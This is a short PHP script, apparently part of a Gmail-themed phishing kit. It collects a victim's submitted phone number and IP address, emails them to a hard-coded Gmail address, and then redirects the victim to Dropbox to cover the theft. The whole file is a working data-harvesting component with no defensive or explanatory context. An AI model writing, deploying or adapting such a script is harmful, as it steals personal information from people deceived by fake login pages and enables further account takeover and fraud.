<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Gmail Tare_ama || :------\n";
$message .= "Phone: ".$_POST['formtext1']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="keiernslopper@gmail.com";
$subject = "tare GMAIL | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://Dropbox.com");
?>